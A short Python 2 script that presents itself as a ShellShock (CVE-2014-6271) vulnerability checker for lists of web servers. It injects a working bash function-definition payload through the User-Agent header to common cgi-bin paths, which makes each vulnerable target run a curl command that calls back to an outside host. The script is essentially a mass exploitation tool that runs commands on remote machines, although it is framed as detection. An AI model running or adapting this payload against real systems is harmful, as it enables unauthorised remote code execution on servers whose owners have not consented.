#!/usr/bin/env python

'''
Script that checks if remote web servers are vulnarable to ShellShock attack (CVE-2014-6271).

Dependencies:
    * python2
        # Debian/Ubuntu: apt-get install python
        # Fedora: dnf install python

    * mechanize
        # Debian/Ubuntu: apt-get install python-mechanize
        # Fedora: dnf install python2-mechanize
'''

EXPLOIT = '() { :;}; echo Content-Type: text/plain ; echo ; /bin/bash -c "'
COMMAND = 'curl -L -s -I http://www.example.com/shell-shock'

from mechanize import Browser, _http
import os
import sys

if len(sys.argv) != 2:
    print 'Usage: ' + sys.argv[0] + ' [filename]'
    print "    * filename - File that contains list of urls.\n"
    sys.exit(1)

URLS_FILE = sys.argv[1]

if not os.path.isfile(URLS_FILE):
    print 'Error: file ' + '"' + URLS_FILE + '"' + " doesn't exist.\n"
    sys.exit(1)

BR = Browser()
URLS = list()

with open(URLS_FILE, 'r') as content:
    for url in content:
        url = url.strip()
        if url not in URLS:
            URLS.append(url)

if bool(URLS):
    for url in URLS:
        if url.find('cgi') == -1 or url.find('bin') == -1:
            if not url.endswith('/'):
                url += '/'

            generated_urls = [
                url,
                url + 'bin',
                url + 'bin/status',
                url + 'cgi',
                url + 'cgi/status',
                url + 'cgi-bin',
                url + 'cgi-bin/status'
            ]

            for generated_url in generated_urls:
                print '> Sending shock to: ' + generated_url
                generated_command = COMMAND + ' -A ' + generated_url
                BR.addheaders = [('User-agent', EXPLOIT + generated_command + '"')]

                try:
                    RESPONSE = BR.open(generated_url)
                except:
                    pass
        else:
            try:
                generated_command = COMMAND + ' -A ' + url
                BR.addheaders = [('User-agent', EXPLOIT + generated_command + '"')]
                RESPONSE = BR.open(url)
            except:
                pass

print '> Finished.'
